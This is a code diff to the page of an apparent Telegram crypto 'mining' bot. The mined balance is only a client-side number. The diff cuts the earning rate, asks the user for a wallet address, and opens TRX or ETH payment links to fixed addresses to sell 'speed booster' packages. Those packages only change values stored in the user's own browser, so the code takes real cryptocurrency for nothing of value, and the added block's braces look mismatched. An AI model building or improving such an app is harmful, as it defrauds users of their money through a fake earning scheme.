@@ -115,7 +115,7 @@
             <h3 style="margin-top: 15px; color: #10b981;"><span id="total-ref-display">0</span> Teman Terundang</h3>
         </div>
         <label style="font-weight: bold;" data-key="ref_link_title">Link Referral Anda:</label>
-        <input type="text" id="ref-link-input" class="input-field" readonly value="https://t.me/ExampleBot?start=ref">
+        <input type="text" id="ref-link-input" class="input-field" readonly value="https://t.me/MiningProPremium_bot?start=ref">
         <button class="action-btn" style="width: 100%;" onclick="salinLinkRef()" data-key="btn_copy">Salin Link</button>
     </div>
 
@@ -242,7 +242,7 @@
                 let sisaWaktu = waktuSelesaiMining - sekarang;
                 let jam = Math.floor(sisaWaktu / 3600);
                 let menit = Math.floor((sisaWaktu % 3600) / 60);
-                saldo += (0.00002 * speedMultiplier);
+                saldo += (0.000005 * speedMultiplier);
                 localStorage.setItem('p_saldo', saldo);
                 renderUIdanSkor();
                 tombol.disabled = true;
@@ -267,16 +267,35 @@
         }
 
         function eksekusiDeepLinkDeposit(koin, harga, speedBooster, durasiBaru, namaPaket) {
-            pemicuIklan();
-            window.open((koin === 'TRX') ? 'tronweb:transfer?to=TYf8H2kS9xLmPqWvZsNxBvYtRnQpWzMx4v&amount=' + harga : 'ethereum:0x71C23f40A257e84124357B7dE434823432B?value=' + harga, '_system');
+    pemicuIklan(); // Membuka iklan
+    
+    // Jeda 2 detik agar iklan terbuka dulu sebelum muncul permintaan wallet
+    setTimeout(() => {
+        let alamatWallet = prompt("Masukkan alamat dompet " + koin + " Anda untuk deposit " + namaPaket + ":");
+        
+        if (alamatWallet != null && alamatWallet != "") {
+            // Logika pemisahan jaringan TRX atau ETH
+            let linkDeposit = (koin === 'TRX') 
+                ? 'tronweb:transfer?to=TYF8H2kS9xLmPqWvZsNxBvYtRnQpA4eC3v&amount=' + harga 
+                : 'ethereum:0x71C23f40A257E84124357B7dE434823432B?value=' + harga;
+            
+            window.open(linkDeposit, '_blank');
+            
+            // Simpan status paket ke browser pengguna
             speedMultiplier = speedBooster;
             limitDurasiMining = durasiBaru;
             namaLevel = namaPaket;
+            
             localStorage.setItem('p_speed', speedMultiplier);
             localStorage.setItem('p_duration', limitDurasiMining);
             localStorage.setItem('p_level_name', namaLevel);
+            
             document.getElementById('user-level-badge').innerText = namaLevel;
+            
+            alert("Alamat " + alamatWallet + " telah dicatat. Silakan selesaikan pembayaran " + harga + " " + koin + " ke alamat yang terbuka.");
         }
+    }, 2000); 
+                  }
 
         function bukaMisi(button, link, reward) {
             pemicuIklan();
